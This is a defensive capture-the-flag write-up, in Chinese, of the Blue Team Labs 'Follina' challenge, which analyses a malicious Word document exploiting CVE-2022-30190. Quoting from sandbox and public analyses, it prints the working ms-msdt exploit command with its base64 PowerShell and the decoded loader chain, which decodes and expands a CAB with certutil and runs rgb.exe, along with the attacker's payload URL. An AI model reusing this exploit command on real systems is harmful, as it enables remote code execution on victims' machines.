---
title: BTLO - Follina
tags: [Incident Response, BTLO]

category: "Security > Practice > BTLO > Incident Response"
---

# BTLO - Follina
Challenge: https://blueteamlabs.online/home/challenge/follina-f1a3452f34

:::spoiler TOC
[TOC]
:::
:::danger
因為給予的題目是真實的樣本，所以盡量在乾淨的環境或是reliable的sandbox進行測試
:::
## Scenario
>  On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team. 

## Tools
VirusTotal
Any.Run
OSINT 

## ==Q1==
> What is the SHA1 hash value of the sample? (Format: SHA1Hash)
### Recon
直覺會是先丟到virustotal看hash value，或是直接用sha1sum command也可以
### Exploit
```bash
$ sha1sum  ./sample.doc
06727ffda60359236a8029e0b3e8a0fd11c23313  ./sample.doc
```
![圖片](https://hackmd.io/_uploads/BkwsZO0vT.png)

:::spoiler Flag
Flag: `06727ffda60359236a8029e0b3e8a0fd11c23313`
:::
## ==Q2==
> According to VirusTotal, what is the full filetype of the provided sample? (Format: X X X X)
### Recon
其實大部分的資訊都可以在virustotal上找到，包含cve, hash value, c2 ip(domain), attacked file....，所以呈上題，他就顯示在一開始的details分頁
### Exploit
![圖片](https://hackmd.io/_uploads/B1B4MuCDa.png)

:::spoiler Flag
Flag: `office open xml document`
:::
## ==Q3==
> Extract the URL that is used within the sample and submit it (Format: `https://x.domain.tld/path/to/something`)
### Recon
呈上題，如果在virustotal找不到相關的連線網站，可以考慮用動態的方式，像是用any.run這樣線上的sandbox就蠻適合的，但是缺點就是要付費，如果是白嫖仔只能用win7的project，經過實際的測試，我自己用win7的project拿到的pcap和一般有付費的win10是有落差的，所以建議這樣的情況還是上網找有沒有公開的project可以參閱，例如我找到到的[這一個](https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/)，紀錄就非常的完整，不只有完整的Mitre手法、錄影的方式呈現而非截圖、和外部連線的flow也非常完整，這些都是非常吸引人的地方
### Exploit
* 方法一: VirusTotal
    ![圖片](https://hackmd.io/_uploads/HJCtf_CD6.png)
* 方法二: Public Any.Run Task
    有了前面的公開project支援，在network flow的地方就可以看到他頻繁的和某一個domain連線，也就是此次的答案
    ![圖片](https://hackmd.io/_uploads/B1uIruCDT.png)

:::spoiler Flag
Flag: `https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html`
:::
## ==Q4==
> What is the name of the XML file that is storing the extracted URL? (Format: file.name.ext
### Recon
現在我們知道了他和外部連線的domain，現在要看他在哪一個file出現過，所以就用老方法直接grep search就好
### Exploit
```bash!
$ unzip sample.doc
Archive:  sample.doc
  inflating: [Content_Types].xml     
  inflating: docProps/app.xml        
  inflating: docProps/core.xml       
  inflating: word/document.xml       
  inflating: word/fontTable.xml      
  inflating: word/settings.xml       
  inflating: word/styles.xml         
  inflating: word/webSettings.xml    
  inflating: word/theme/theme1.xml   
  inflating: word/_rels/document.xml.rels  
  inflating: _rels/.rels             
$ grep -r -i 'https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html' *
word/_rels/document.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html!" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
```

:::spoiler Flag
Flag: `document.xml.rels`
:::
## ==Q5==
> The extracted URL accesses a HTML file that triggers the vulnerability to execute a malicious payload. According to the HTML processing functions, any files with fewer than `<Number>` bytes would not invoke the payload. Submit the `<Number>` (Format: Number of Bytes)
### Recon
這一題是看[^wp1]的說明才知道答案的，首先我並不知道他中間傳輸的command為何，並且根據Fortinet的報告[^wp4]，可以知道這一個攻擊的具體poc以及mitigation，以下是從any.run project擷取下來的攻擊command，
```bash!
"C:\WINDOWS\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO"
```
根據[^wp2]的說明，這是使用 ms-msdt 的架構，使用參數 IT_BrowseForFile 呼叫本機套件 PCWDiagnostic，其中包含嵌入在 $() 中的 PowerShell 語法，用base64 decode過後的關鍵payload如下:
```bash
$cmd = "c:\windows\system32\cmd.exe";
Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";
Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";
```
以下是根據[^wp2]針對每一個步驟做簡短說明:
> Starts hidden windows to:
> Kill msdt.exe if it is running
> Loop through files inside a RAR file, looking for a Base64 string for an encoded CAB file
> Store this Base64 encoded CAB file as 1.t
> Decode the Base64 encoded CAB file to be saved as 1.c
> Expand the 1.c CAB file into the current directory, and finally:
> Execute rgb.exe (presumably compressed inside the 1.c CAB file)

這是一個很嚴重的風險等級，victim只要點擊相關的檔案，就會觸發一系列攻擊的payload，也可以看[^wp5]示範如何利用該漏洞pwn下一台主機，讓攻擊者達到RCE的poc影片，影片中提到使用者只要點擊攻擊文件，甚至只是用內建的預覽功能，也可以在沒有點擊的情況下在背後run一系列payload

### Exploit
這一題根據[^wp2]的說明以及[^wp3-twitter]的實測，會發現只要經過padding使得總字串的長度大於等於4096就不會觸發核心的攻擊payload，原因是 HTML 處理函數的Hardcoded buffer的大小就是4096，所以如果大於這個數量，payload就沒辦法invoke進去

:::spoiler Flag
Flag: `4096`
:::
## ==Q6==
> After execution, the sample will try to kill a process if it is already running. What is the name of this process? (Format: filename.ext)
### Recon
根據前一題的描述，以及base64 decode過後的結果會發現如果process中有msdt.exe的話就先kill掉

:::spoiler Flag
Flag: `msdt.exe`
:::
## ==Q7==
> You were asked to write a process-based detection rule using Windows Event ID 4688. What would be the ProcessName and ParentProcessname used in this detection rule? [Hint: OSINT time!] (Format: ProcessName, ParentProcessName)
### Recon
這個可以直接看any run的process info，從process之間的關係可以知道msdt.exe的parent process是winword.exe，所以要設定條件的話可以從這邊下手
![圖片](https://hackmd.io/_uploads/r1rMwq0Dp.png)

:::spoiler Flag
Flag: `msdt.exe, WINWORD.EXE`
:::
## ==Q8==
> Submit the MITRE technique ID used by the sample for Execution [Hint: Online sandbox platforms can help!] (Format: TXXXX)
### Recon
這個也是可以直接看any run public task的cve紀錄，裡面會記錄有關mitre針對該攻擊使用的手法，如下圖
![圖片](https://hackmd.io/_uploads/BJKG_5CPp.png)
有關Execution的手法紀錄的是T1059.003，攻擊者使用windows command shell(CMD)執行一系列的腳本或payload
![圖片](https://hackmd.io/_uploads/B1QBu5Awa.png)
![圖片](https://hackmd.io/_uploads/Hy-Jtc0DT.png)

### Exploit
:::spoiler Flag
Flag: `T1059`
:::
## ==Q9==
> Submit the CVE associated with the vulnerability that is being exploited (Format: CVE-XXXX-XXXXX)
### Recon
這個可以看virustotal的紀錄
![圖片](https://hackmd.io/_uploads/H1pLt5RDT.png)

:::spoiler Flag
Flag: `CVE-2022-30190`
:::

## Reference
[^wp1]:[Blue Team Labs: Follina](https://medium.com/@higgsborn/blue-team-labs-follina-13efe22e80e4)
[^wp2]:[Rapid Response: Microsoft Office RCE - “Follina” MSDT Attack](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug)
[^wp3-twitter]:[Twitter Experience Result - John Hammond](https://twitter.com/_JohnHammond/status/1531170265039781888)
[^wp4]:[起底 CVE-2022-30190：微軟支援診斷工具（MSDT）高風險 RCE 漏洞 “Follina”](https://m.fortinet.com.tw/site/cve-2022-30190-microsoft-support-diagnostic-tool-msdt-rce-vulnerability-follina/)
[^wp5]:[MS-MSDT "Follina" Office click-to-hack.](https://twitter.com/_JohnHammond/status/1531125503725289472)